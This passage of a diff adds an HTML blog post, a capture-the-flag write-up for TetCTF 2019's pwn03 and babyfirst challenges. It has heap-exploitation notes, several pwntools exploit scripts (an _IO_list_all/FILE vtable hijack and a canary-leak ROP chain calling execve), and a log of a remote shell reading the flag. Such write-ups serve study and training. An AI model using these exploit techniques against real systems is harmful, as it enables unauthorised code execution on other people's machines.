+<li>Allocate all chunks. The target is to corrupt the prev_size of chunk 4 to <code>0x200</code> so when we free it, we have to to unlink a fake chunk at <code>0x320 - 0x200 = 0x120</code></li>
+<li>Fake chunk will be created inside chunk 1</li>
+<li>Shrink a chunk and do the thing and free it so it unlink with the fake chunk</li>
+</ul></li>
+
+<li><p>Can&rsquo;t overwrite the prev_size if the prev chunk is freed :(</p></li>
+
+<li><p>Wait. If I can overlap with the top chunk so I can control 2 chunk while it&rsquo;s both free and allocated :o</p></li>
+
+<li><p>SO new plan</p>
+
+<ul>
+<li>Get the overlap at chunk 1</li>
+<li>When allocate again chunk 2 is the same as chunk 1</li>
+<li>Allocate 3 and 4 then do the trick above. Free 2 so the prev_in_use bit is unset be we can still overwrite the prev_size. This will allow 3 to unlink a fake chunk when we free it.</li>
+</ul></li>
+
+<li><p>Surprisingly freeing the overlap chunk put it in unsorted bin and we can control the bins while it&rsquo;s on the free list. Here we go</p></li>
+
+<li><p>Now I can write a pointer to the heap (actually it&rsquo;s address of main_arena) to what seems like an arbitrary location</p></li>
+
+<li><p>Alright so eventually I&rsquo;ve found out that it&rsquo;s a FILE structure exploit where I can overwrite <code>_IO_list_all</code> with the address of an unsorted bin. We can get the shell by triggering an error and all the file pointers will be closed. Basically we&rsquo;ll overwrite the address of <code>_IO_OVERFLOW</code> in the FILE vtable with <code>system</code>. In addition, we need to forge a FILE structure to satisfy some condition so the overwritten <code>_IO_OVERFLOW</code> function is called. The FILE structure will be at the smallbin of size 0x60 (smallbin[4])</p></li>
+
+<li><p>Need vtable address at 0x218</p></li>
+
+<li><p>Actually what we did is pointing <code>_IO_list_all</code> to a fake filestream and a fake vtable and in that vtable the entry of <code>_IO_OVERFLOW</code> is <code>system</code> as we set it up.</p></li>
+</ul>
+
+<pre><code class="language-python">from __future__ import print_function
+from pwn import *
+import os
+
+GDBSCRIPT = &quot;&quot;&quot;
+&quot;&quot;&quot;
+HOST = '18.136.126.78'
+PORT = 1336
+BIN = './pwn03'
+LIBC = './libc-2.23.so'
+
+
+ALLOC = '1'
+EDIT = '2'
+REMOVE = '3'
+SHOW = '4'
+EXIT = '5'
+PROMPT = 'YOUR CHOICE : '
+
+libc = ELF(LIBC)
+
+addrs = {
+    'mainarena': 0x3c4b78,
+    'mallochook': libc.symbols['__malloc_hook'],
+    'stdin': 0x3c48e0,
+    'iolistall': 0x3c5520,
+    'system': libc.symbols['system']
+}
+
+
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    e = ELF(BIN)
+    r = process(e.path)#, env={'LD_PRELOAD': LIBC})
+
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
+
+def optalloc():
+    r.recvuntil(PROMPT)
+    r.sendline(ALLOC)
+    if 'FULL' in r.recvline():
+        print('ALLOC FAILED')
+
+
+def optedit(idx, magic, content, l=True):
+    r.recvuntil(PROMPT)
+    r.sendline(EDIT)
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+    r.recvuntil('Magic : ')
+    r.sendline(str(magic))
+    r.recvuntil('Content : ')
+    if l:
+        r.sendline(content)
+    else:
+        r.send(content)
+
+def optremove(idx):
+    r.recvuntil(PROMPT)
+    r.sendline(REMOVE)
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+
+def optshow(idx):
+    r.recvuntil(PROMPT)
+    r.sendline(SHOW)    
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+    data = r.recvuntil('\nMENU').split('\n')[:2]
+    magic = int(data[0].split('Magic : ')[1])
+    content = data[1].split('Content : ')[1].ljust(8, '\x00')
+    content = u64(content)
+    return (magic, content)
+
+def optexit():
+    r.recvuntil(PROMPT)
+    r.sendline(EXIT)
+
+def leak():
+    optalloc()  # 0
+    optalloc()  # 1
+    optalloc()  # 2
+    optalloc()  # 3
+    optremove(0) # -0
+    optremove(2) # -2
+    optalloc()  # 0
+    leakptrs = optshow(0)
+    libcbase = leakptrs[0] - addrs['mainarena']
+    heapbase = leakptrs[1] - 0x140
+    return (libcbase, heapbase)    
+
+def heapexp():
+    global libcbase
+    global heapbase
+    
+    addrs['system'] += libcbase
+    payload = p64(0) * 4
+    payload += p64(heapbase + 0x220 - 0x18)
+    payload += p64(addrs['system'])
+    optedit(3, 0x0, payload)
+    
+    optalloc()  # 2
+    # By pass prev_size vs size when dealing with chunk 1 later
+    # If it's freed, it'll be checked
+    payload = 'A' * (0x1a0 - 0x158)
+    payload += p64(0x100)
+    optedit(2, 0x13371, payload)
+
+    # Consolidate 1 and 2 to get size 0x140    
+    optremove(1)
+    optremove(2)
+
+    # Overwrite first time
+    chunk1 = heapbase + 0xa0
+    payload = p64(chunk1)
+    payload = payload.ljust(144, 'B')
+    optedit(0, chunk1, payload)
+
+    # Populate chunk 1 with the correct fd and bk
+    payload = p64(heapbase)
+    optalloc()  # 1
+    optedit(1, heapbase, payload)
+
+    # Free 3 so it consolidate with top chunk and chunk 1
+    # because of the incorrect size. After this, chunk 1
+    # will overlap with top chunk. Another alloc will make
+    # chunk 2 the same as chunk 1
+    optremove(3)
+    optalloc()  # 2
+    
+    # Do the trick
+    optalloc()  # 3
+
+#    optalloc()  # 4
+    # Set prev_in_use of chunk 3 to 0
+    # This also put chunk 1/2 to unsorted bin
+    optremove(2)
+    
+    # Modify prev_size of chunk 3
+#    payload = '1' * 8
+#    payload += 'D' * (144 - 8 * 2)
+#    payload += '\x00\x01'
+    addrs['iolistall'] += libcbase
+    print('iolistall @ {:#x}'.format(addrs['iolistall']))
+    payload = p64(addrs['iolistall'] - 0x10)
+    payload += 'A' * 8
+    optedit(1, 0x13373, payload)   
+ 
+    # Alloc so _IO_list_all is overwritten to main_arena
+    optalloc()  # 2
+    
+    # Now we need to fake a FILE at chunk 3 (0x140)
+    # Edit chunk 1/2 to write /bin/sh to the beginning of chunk 3
+    payload = 'F' * (144 - 8)
+    payload += '/bin/sh'
+    optedit(2, 0x1336, payload)
+
+    # Craft filestream
+    # Magic: _IO_read_end
+    # _IO_read_base
+    fs = p64(addrs['iolistall'] - 0x10)
+#    fs = p64(0xdeadbeef)
+    fs += p64(0) + p64(1) # _IO_write_base &lt; _IO_write_ptr
+    fs = fs.ljust(143, '\x00')
+    optedit(3, 0x0, fs)
+    r.interactive() 
+
+def main():
+    raw_input('pwn?')
+    global libcbase
+    global heapbase
+    libcbase, heapbase = leak()
+    print(&quot;libc @ {:#x}&quot;.format(libcbase))
+    print(&quot;heap @ {:#x}&quot;.format(heapbase))
+    heapexp()
+    r.close()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<pre><code class="language-python">from __future__ import print_function
+from pwn import *
+import os
+
+GDBSCRIPT = &quot;&quot;&quot;
+&quot;&quot;&quot;
+HOST = '18.136.126.78'
+PORT = 1336
+BIN = './pwn03'
+LIBC = './libc-2.23.so'
+
+
+ALLOC = '1'
+EDIT = '2'
+REMOVE = '3'
+SHOW = '4'
+EXIT = '5'
+PROMPT = 'YOUR CHOICE : '
+
+libc = ELF(LIBC)
+
+addrs = {
+    'mainarena': 0x3c4b78,
+    'mallochook': libc.symbols['__malloc_hook']
+}
+
+
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    e = ELF(BIN)
+    r = process(e.path)#, env={'LD_PRELOAD': LIBC})
+
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
+
+def optalloc():
+    r.recvuntil(PROMPT)
+    r.sendline(ALLOC)
+    if 'FULL' in r.recvline():
+        print('ALLOC FAILED')
+
+
+def optedit(idx, magic, content, l=True):
+    r.recvuntil(PROMPT)
+    r.sendline(EDIT)
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+    r.recvuntil('Magic : ')
+    r.sendline(str(magic))
+    r.recvuntil('Content : ')
+    if l:
+        r.sendline(content)
+    else:
+        r.send(content)
+
+def optremove(idx):
+    r.recvuntil(PROMPT)
+    r.sendline(REMOVE)
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+
+def optshow(idx):
+    r.recvuntil(PROMPT)
+    r.sendline(SHOW)    
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+    data = r.recvuntil('\nMENU').split('\n')[:2]
+    magic = int(data[0].split('Magic : ')[1])
+    content = data[1].split('Content : ')[1].ljust(8, '\x00')
+    content = u64(content)
+    return (magic, content)
+
+def optexit():
+    r.recvuntil(PROMPT)
+    r.sendline(EXIT)
+
+def leak():
+    optalloc()  # 0
+    optalloc()  # 1
+    optalloc()  # 2
+    optalloc()  # 3
+    optremove(0) # -0
+    optremove(2) # -2
+    optalloc()  # 0
+    leakptrs = optshow(0)
+    libcbase = leakptrs[0] - addrs['mainarena']
+    heapbase = leakptrs[1] - 0x140
+    return (libcbase, heapbase)    
+
+def heapexp():
+    global libcbase
+    global heapbase
+   
+    optalloc()  # 2
+    
+    # By pass prev_size vs size when dealing with chunk 1 later
+    # If it's freed, it'll be checked
+    payload = 'A' * (0x1a0 - 0x158)
+    payload += p64(0x100)
+    optedit(2, 0x13371, payload)
+
+    # Consolidate 1 and 2 to get size 0x140    
+    optremove(1)
+    optremove(2)
+
+    # Overwrite first time
+    chunk1 = heapbase + 0xa0
+    payload = p64(chunk1)
+    payload = payload.ljust(144, 'B')
+    optedit(0, chunk1, payload)
+
+    # Populate chunk 1 with the correct fd and bk
+    payload = p64(heapbase)
+    optalloc()  # 1
+    optedit(1, heapbase, payload)
+
+    # Free 3 so it consolidate with top chunk and chunk 1
+    # because of the incorrect size. After this, chunk 1
+    # will overlap with top chunk. Another alloc will make
+    # chunk 2 the same as chunk 1
+    optremove(3)
+    optalloc()  # 2
+    
+    # Do the trick
+    optalloc()  # 3
+    optalloc()  # 4
+
+    # Set prev_in_use of chunk 3 to 0
+    # This also put chunk 1/2 to unsorted bin
+    optremove(2)
+    
+    # Modify prev_size of chunk 3
+#    payload = '1' * 8
+#    payload += 'D' * (144 - 8 * 2)
+#    payload += '\x00\x01'
+    payload = p64(heapbase + 0xa0)
+    optedit(1, 0x13373, payload)   
+ 
+    # Make fake chunk at 0x040
+#    payload = 'C' * (8 * 6)
+#    payload += p64(0x100) # 0x048
+#    payload += p64(heapbase + 0x60) * 2
+#    payload += 'C' * (8 * 2)
+#    payload += p64(heapbase + 0x40) * 2
+#    optedit(0, 0x13372, payload)
+
+    # At this point, chunk 1/2 is the head of unsorted bin.
+    # We can control pointers here
+    r.interactive() 
+
+def main():
+    raw_input('pwn?')
+    global libcbase
+    global heapbase
+    libcbase, heapbase = leak()
+    print(&quot;libc @ {:#x}&quot;.format(libcbase))
+    print(&quot;heap @ {:#x}&quot;.format(heapbase))
+    heapexp()
+    r.close()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<pre><code class="language-python"># 0x555555757010
+# 0x5555557570b0
+# 0x555555757150
+# 0x5555557571f0
+# 0x555555757290
+
+from __future__ import print_function
+from pwn import *
+import os
+
+GDBSCRIPT = &quot;&quot;&quot;
+&quot;&quot;&quot;
+HOST = '18.136.126.78'
+PORT = 1336
+BIN = './pwn03'
+LIBC = './libc-2.23.so'
+
+
+ALLOC = '1'
+EDIT = '2'
+REMOVE = '3'
+SHOW = '4'
+EXIT = '5'
+PROMPT = 'YOUR CHOICE : '
+
+libc = ELF(LIBC)
+
+addrs = {
+    'mainarena': 0x3c4b78 
+}
+
+
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    e = ELF(BIN)
+    r = process(e.path, env={'LD_PRELOAD': LIBC})
+
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
+
+def optalloc():
+    r.recvuntil(PROMPT)
+    r.sendline(ALLOC)
+    if 'FULL' in r.recvline():
+        print('ALLOC FAILED')
+
+
+def optedit(idx, magic, content, l=True):
+    r.recvuntil(PROMPT)
+    r.sendline(EDIT)
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+    r.recvuntil('Magic : ')
+    r.sendline(str(magic))
+    r.recvuntil('Content : ')
+    if l:
+        r.sendline(content)
+    else:
+        r.send(content)
+
+def optremove(idx):
+    r.recvuntil(PROMPT)
+    r.sendline(REMOVE)
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+
+def optshow(idx):
+    r.recvuntil(PROMPT)
+    r.sendline(SHOW)    
+    r.recvuntil('Index : ')
+    r.sendline(str(idx))
+    data = r.recvuntil('\nMENU').split('\n')[:2]
+    magic = int(data[0].split('Magic : ')[1])
+    content = data[1].split('Content : ')[1].ljust(8, '\x00')
+    content = u64(content)
+    return (magic, content)
+
+def optexit():
+    r.recvuntil(PROMPT)
+    r.sendline(EXIT)
+
+def leak():
+    optalloc()  # 0
+    optalloc()  # 1
+    optalloc()  # 2
+    optalloc()  # 3
+    optremove(0)
+    optremove(2)
+    optalloc()  # 0
+    leakptrs = optshow(0)
+    libcbase = leakptrs[0] - addrs['mainarena']
+    heapbase = leakptrs[1] - 0x140
+    return (libcbase, heapbase)    
+
+def heapexp():
+    optalloc()  # 2
+    
+    payload = 'A' * (0xa0 - 0x58) + 'B\x01'
+    optedit(2, 0x13371337, payload)
+    payload = 'A' * (0xa0 - 0x58)
+    optedit(2, 0x13371337, payload)
+    optremove(1)    
+    optremove(2)
+    
+    payload = 'A' * 144
+    optedit(0, 0x13371337, payload)
+    
+    r.interactive()    
+
+def main():
+    raw_input('pwn?')
+    libcbase, heapbase = leak()
+    print(&quot;libc @ {:#x}&quot;.format(libcbase))
+    print(&quot;heap @ {:#x}&quot;.format(heapbase))
+    heapexp()
+    r.close()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<p><a name="TetCTF-babyfirst"></a></p>
+
+<h2 id="babyfirst">Babyfirst</h2>
+
+<ul>
+<li>The binary has all protections on.</li>
+<li>The binary implements its own read function.</li>
+<li>The binary reads a password of length 0x20 from /dev/urandom</li>
+<li>Login function:
+
+<ul>
+<li>If the username starts with <code>admin</code> then prompt for a password.</li>
+<li>Otherwise save the username to the buffer and count that as a logged in user.</li>
+</ul></li>
+<li>Leak password:
+
+<ul>
+<li>Input an accepted username of length 0x20 so it reaches the password buffer. The username must not starts with <code>admin</code> so it can be saved to the buffer without a password.</li>
+<li>Choose to play so the username with the password is printed out.</li>
+</ul></li>
+<li>Play function:
+
+<ul>
+<li>It reads input of length 128 maximum and output it. This is stack overflow so we can leak the canary, binary base and libc base all in here.</li>
+<li>After that, this can be a normal BoF challenge.</li>
+</ul></li>
+</ul>
+
+<pre><code>Before:
+0x0d60806019c93615	0xef683548a35d647c
+0x44346fe9e7682bf5	0x899ccab9462b6744
+
+After:
+0x0d60806019c93615	0xef683548a35d647c
+0x44346fe9e7682bf5	0x899ccab9462b6744
+
+</code></pre>
+
+<p><code>exploit.py</code>:</p>
+
+<pre><code class="language-python">from __future__ import print_function
+from pwn import *
+import os
+
+GDBSCRIPT = &quot;&quot;&quot;
+&quot;&quot;&quot;
+HOST = 'babyfirst.chung96vn.cf'
+PORT = 31337
+BIN = './babyfirst'
+LIBC = './libc-2.27.so'
+
+PROMPT = 'Your choice: '
+LOGIN = '1'
+PLAY = '2'
+EXIT = '3'
+
+bin_offset = 0xfc0
+libc_offset = 0x21b97
+libc = ELF(LIBC)
+
+addrs = {
+    'system': libc.symbols['system'],
+    'binsh': libc.search('/bin/sh').next(),
+    'poprdi': 0x000000000002155f,
+    'poprax': 0x00000000000439c8,
+    'poprsi': 0x0000000000023e6a,
+    'poprdx': 0x0000000000001b96,
+    'syscall': 0x00000000000d2975
+}
+
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    e = ELF(BIN)
+    r = process(e.path, env={'LD_PRELOAD': LIBC})
+
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
+
+def login(username, password=None):
+    r.recvuntil(PROMPT)
+    r.sendline(LOGIN)
+    r.recvuntil('User Name: ')
+    r.sendline(username)
+    if password != None:
+        r.recvuntil('Password: ')
+        r.sendline(password)
+
+def play(play=None, payload=None):
+    r.recvuntil(PROMPT)
+    r.sendline(PLAY)
+    if play == None:
+        return r.recvuntil('Test Version only support for admin~')
+    r.recvuntil('Content: ')
+ 
+    # Leak stack
+    payload = 'A' * (8 * 4)
+    r.send(payload)
+    stack = r.recvuntil('\n').split(payload)[1]
+    if len(stack) &lt; 6:
+        print(&quot;LEAK STACK FAILED&quot;)
+        exit(1)
+    stack = stack[:6].ljust(8, '\x00')
+    stack = u64(stack) - 0x140
+    print(&quot;STACK = {}&quot;.format(hex(stack)))
+
+    # Leaking canary
+    payload = 'A' * (8 * 5 + 1)
+    r.send(payload)
+    canary = r.recvuntil('\n').split(payload)[1]
+    if len(canary) &lt; 7:
+        print(&quot;LEAK CANARY FAILED&quot;)
+        exit(1)
+    canary = canary[:7].rjust(8, '\x00')
+    canary = u64(canary)
+    print(&quot;CANARY = {}&quot;.format(hex(canary)))
+
+    # Leaking binary
+    payload = 'A' * (8 * 12)
+    r.send(payload)
+    binleak = r.recvuntil('\n').split(payload)[1]
+    if len(binleak) &lt; 6:
+        print(&quot;LEAK BINARY FAILED&quot;)
+        exit(1)
+    binleak = binleak[:6].ljust(8, '\x00')
+    binleak = u64(binleak)
+    print(&quot;BINLEAK = {}&quot;.format(hex(binleak)))
+
+    binbase = binleak - bin_offset
+    print(&quot;BIN BAsE = {}&quot;.format(hex(binbase)))
+
+    # Leaking libc
+    payload = 'A' * (8 * 13)
+    r.send(payload)
+    libcleak = r.recvuntil('\n').split(payload)[1]
+    if len(libcleak) &lt; 6:
+        print(&quot;LEAK LIBC FAILED&quot;)
+        exit(1)
+    libcleak = u64(libcleak[:6].ljust(8, '\x00'))
+    print(&quot;LIBCLEAK = {}&quot;.format(hex(libcleak)))
+
+    libcbase = libcleak - libc_offset
+    print(&quot;LIBC BASE = {}&quot;.format(hex(libcbase)))
+    
+    for k in addrs.keys():
+        addrs[k] += libcbase
+
+    payload = 'A' * (8 * 2)
+    payload += p64(addrs['binsh'])
+    payload += '\x00' * (8 * 2)
+    payload += p64(canary)
+    payload += 'B' * 8
+    payload += p64(addrs['poprdi'])
+    payload += p64(addrs['binsh'])
+    payload += p64(addrs['poprsi'])
+    payload += p64(stack + 0x10)
+    payload += p64(addrs['poprdx'])
+    payload += p64(0x0)
+    payload += p64(addrs['poprax'])
+    payload += p64(59)
+    payload += p64(addrs['syscall'])
+    assert len(payload) &lt;= 128
+    r.send(payload)
+    
+    print(repr(r.recvuntil('\n')))
+    print(&quot;END==&quot;)
+    r.sendline('END')
+    print(r.recvuntil('\n'))
+    r.interactive()
+
+def exit():
+    r.recvuntil(PROMPT)
+    r.sendline(EXIT)
+
+def leakpass():
+    login('A' * 32)
+    leak = play()
+    leak = leak.split('A' * 32)[1].split('\nTest Version only support for admin~')[0]
+    if len(leak) &lt; 0x10:
+        print(&quot;LEAK PASSWORD FAILED&quot;)
+        return None
+    leak = leak[:0x10]
+    return leak
+
+def main():
+    raw_input(&quot;pwn?&quot;)
+    password = leakpass()
+    print(&quot;PASSWORD: {}&quot;.format(password.encode('hex')))
+    login(&quot;admin&quot;, password)
+    play(play=True)
+    r.close()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<pre><code class="language-bash">➜  babyfirst remote=1 python exploit.py
+[*] '/home/me/Desktop/tetctf/babyfirst/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to babyfirst.chung96vn.cf on port 31337: Done
+pwn?
+PASSWORD: ead76d78b8c95156fc838dd20e633463
+STACK = 0x7ffdf4dbd4a0
+CANARY = 0x2963933cecc44c00
+BINLEAK = 0x55b917de2fc0
+BIN BAsE = 0x55b917de2000
+LIBCLEAK = 0x7fe18044cb97
+LIBC BASE = 0x7fe18042b000
+'AAAAAAAAAAAAAAAA\x9a\xee]\x80\xe1\x7f\n'
+END==
+END
+
+[*] Switching to interactive mode
+Every things is OK~~
+$ ls
+bin
+boot
+dev
+etc
+home
+init.sh
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$ ls -la
+total 80
+drwxr-xr-x   1 root root 4096 Dec 29 02:15 .
+drwxr-xr-x   1 root root 4096 Dec 29 02:15 ..
+-rwxr-xr-x   1 root root    0 Dec 29 02:15 .dockerenv
+drwxr-xr-x   2 root root 4096 Nov 12 20:56 bin
+drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
+drwxr-xr-x   5 root root  340 Dec 29 02:15 dev
+drwxr-xr-x   1 root root 4096 Dec 29 02:15 etc
+drwxr-xr-x   1 root root 4096 Dec 29 02:15 home
+-rwxr-xr-x   1 root root   54 Dec 29 02:12 init.sh
+drwxr-xr-x   1 root root 4096 Nov 12 20:54 lib
+drwxr-xr-x   2 root root 4096 Nov 12 20:55 lib64
+drwxr-xr-x   2 root root 4096 Nov 12 20:54 media
+drwxr-xr-x   2 root root 4096 Nov 12 20:54 mnt
+drwxr-xr-x   2 root root 4096 Nov 12 20:54 opt
+dr-xr-xr-x 120 root root    0 Dec 29 02:15 proc
+drwx------   1 root root 4096 Dec 31 17:27 root
+drwxrwxr--   1 root root 4096 Dec 29 02:15 run
+drwxr-xr-x   1 root root 4096 Nov 19 21:20 sbin
+drwxr-xr-x   2 root root 4096 Nov 12 20:54 srv
+dr-xr-xr-x  13 root root    0 Dec 31 18:54 sys
+drwx-wx-wt   1 root root 4096 Dec 25 09:48 tmp
+drwxr-xr-x   1 root root 4096 Nov 12 20:54 usr
+drwxr-xr-x   1 root root 4096 Nov 12 20:56 var
+$ cd /home
+$ ls
+babyfirst
+$ cd babyfirst
+$ ls
+babyfirst
+flag
+run.sh
+$ ls -la
+total 52
+drwxr-x--- 1 root babyfirst  4096 Dec 31 17:37 .
+drwxr-xr-x 1 root root       4096 Dec 29 02:15 ..
+-rwxr-x--- 1 root babyfirst   220 Apr  4  2018 .bash_logout
+-rwxr-x--- 1 root babyfirst  3771 Apr  4  2018 .bashrc
+-rwxr-x--- 1 root babyfirst   807 Apr  4  2018 .profile
+-rwxr-x--- 1 root babyfirst 13448 Dec 31 17:36 babyfirst
+-r--r----- 1 root babyfirst    25 Dec 29 02:21 flag
+-rwxr-x--- 1 root babyfirst    67 Dec 29 02:15 run.sh
+$ cat flag
+TetCTF{Y0U_4r3_N0T_Baby}
+$ cat run.sh
+#!/bin/sh
+#
+
+exec 2&gt;/dev/null
+timeout 60 /home/babyfirst/babyfirst
+[*] Got EOF while reading in interactive
+$ 
+</code></pre>
+
+<ul>
+<li>Initially I made a call to <code>system(&quot;/bin/sh&quot;)</code> but it didn&rsquo;t work. My guest was that this new glibc 2.27 does some additional checks so the function can&rsquo;t be called directly like that. That&rsquo;s why I ended up doing a <code>sys_execve</code> instead.</li>
+</ul>
+
+              </section>
+
+              <footer class="post-footer">
+                  <div class="post-tags">
+            
+            
+                <a href="https://protegototalum.faith/tags/ctf/">CTF</a>
+            
+                <a href="https://protegototalum.faith/tags/pwn/">pwn</a>
+            
+                <a href="https://protegototalum.faith/tags/reversing/">reversing</a>
+            
+                <a href="https://protegototalum.faith/tags/tetctf/">TetCTF</a>
+            
+            
+                  </div>
+                
+                    <div class="post-share">
+                        <a class="fa fa-reddit-alien" href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent(window.location); return false">
+                            <span>Reddit</span>
+                        </a>
+                        <a class="fa fa-twitter" href="https://twitter.com/share?text=TetCTF%2019&url=https%3a%2f%2fprotegototalum.faith%2fpost%2ftetctf-19%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                            <span>Twitter</span>
+                        </a>
+                    </div>
+            
+              </footer>
+
+            
+                <aside class="post-comments">
+    
+    
+    <div id="disqus_thread"></div>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+    
+</aside>
+
+            
+            </div>
+
+            <nav class="post-nav">
+                
+                
+                    <a class="post-nav-item post-nav-prev" href="https://protegototalum.faith/post/35c3-ctf/">
+                        <section class="post-nav-teaser">
+                            <span class="post-nav-icon"><i class="fa fa-chevron-right"></i></span>
+                            <span class="post-nav-info">
+                                <h4 class="post-nav-title">35C3 CTF</h4>
+                            </span>
+                        </section>
+                    </a>
+                
+                <div class="clear"></div>
+            </nav>
+
+        </div>
+    </article>
+</main>
+
+                <div id="body-class" style="display: none;"></div>
+                <footer id="footer">
+                    <section class="credits">
+                        <span class="credits-license"><i class="fa fa-copyright"></i>2019 Protego Totalum Security
+                    </span>
+                    </section>
+                </footer>
+                
+
+                
+<div id="menu" data-target="menu">
+    <div class="menu-header">
+        <span class="menu-label">Main Menu</span>
+        <a class="menu-close" data-action="menu" data-target="menu"></a>
+    </div>
+
+    <div class="menu-list">
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/about/">About me</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/projects/">Projects</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/tags/">Tags</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/categories/">Categories</a>
+        </li>
+        
+        <li class="menu-list-item menu-list-social">
+            <a href="https://twitter.com/flyingpassword" title="Protego Totalum Security on Twitter"><i class="fa fa-twitter"></i></a>
+            <a href="https://linkedin.com/in/ducphanduy" title="Protego Totalum Security on LinkedIn"><i class="fa fa-linkedin"></i></a>
+            <a href="https://github.com/ducphanduyagentp" title="Protego Totalum Security on GitHub"><i class="fa fa-github"></i></a>
+        </li>
+    </div>
+
+</div>
+
+
+                
+                <div class="overlay"></div>
+            </div>
+        </section>
+
+    <script async src="/js/main.js"></script>
+
+
+
+  <noscript><link rel="stylesheet" href="/css/main.css"></noscript>
+</body>
+</html>
+
